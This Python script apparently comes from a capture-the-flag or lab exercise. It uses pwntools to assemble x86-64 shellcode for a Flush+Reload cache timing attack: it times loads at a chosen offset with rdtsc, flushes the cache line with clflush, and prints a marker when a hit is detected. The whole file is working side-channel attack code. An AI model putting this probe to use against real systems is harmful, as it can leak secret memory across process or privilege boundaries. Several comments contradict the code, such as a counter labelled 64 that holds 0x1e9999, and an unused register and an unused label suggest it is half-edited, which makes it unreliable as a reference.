from pwn import *

def final_payload(EXE, pVal):  # print a "\ntime:\t" prefix
    context.binary = EXE

    # Initialize shellcode
    shellcode = ""

    # Initialize counter
    shellcode += shellcraft.mov('rcx', 0x1e9999)  # Set counter to 64

    # Begin loop
    shellcode += 'loop_start:\n'

    # Preserve rcx
    shellcode += '  push rcx\n'



    shellcode += '  mov rdi, [rsp + 8]\n'
    
    # Wait 100,000 cycles to flush+relaod again
    shellcode += shellcraft.mov('rcx', 100000)
    shellcode += 'wait_loop:\n'
    shellcode += ' dec rcx\n'
    shellcode += ' test rcx, rcx\n'
    shellcode += ' jnz wait_loop\n'

    
    shellcode += shellcraft.mov('rcx', pVal)
    shellcode += '  add rdi, rcx\n'
    shellcode += shellcraft.mov('r11', 4)

    shellcode += 'start_probe:\n'
    
    #shellcode += '  mov rax, [rdi]\n'

    shellcode += '  mfence\n'
    shellcode += '  lfence\n'
    shellcode += '  rdtsc\n'
    shellcode += '  lfence\n'
    shellcode += '  mov rbx, rax\n'
    shellcode += '  mov r10, [rdi]\n'

    shellcode += '  lfence\n'
    shellcode += '  rdtsc\n'
    shellcode += '  sub rax, rbx\n'
    
    shellcode += '  clflush [rdi]\n'

    shellcode += '  cmp rax, 120\n'  # Replace THRESHOLD with your actual threshold value

    # Jump to skip_print if the condition is not met
    shellcode += '  jge skip_print\n'

    # Store the reload time on the stack for printing
    shellcode += shellcraft.mov('rax', 1)
    shellcode += '  push rax\n'  # Store timing value 8 bytes before the string on the stack
    # Store an 8-byte string on the stack to print as a prefix
    shellcode += shellcraft.pushstr("\nTime:\t")

    # Write the reload time to STDOUT
    shellcode += shellcraft.mov('r9', 1)  # STDOUT file descriptor
    shellcode += '  lea rsi, [rsp]\n'  # Source address (8 bytes before the string where time is)
    shellcode += shellcraft.mov('rdx', 16)  # Number of bytes to write
    shellcode += shellcraft.syscall('SYS_write', 'r9', 'rsi', 'rdx')

    # Restore rcx
    shellcode += '  add rsp, 8\n'  # Remove the string from the stack
    shellcode += '  pop rax\n'

    shellcode += 'skip_print:\n'


    

    shellcode += '  pop rcx\n'

    # Decrement counter and check if zero
    shellcode += '  dec rcx\n'
    shellcode += '  test rcx, rcx\n'
    shellcode += '  jnz loop_start\n'


    # Exit
    shellcode += shellcraft.amd64.exit(0)  # Exit

    return asm(shellcode)


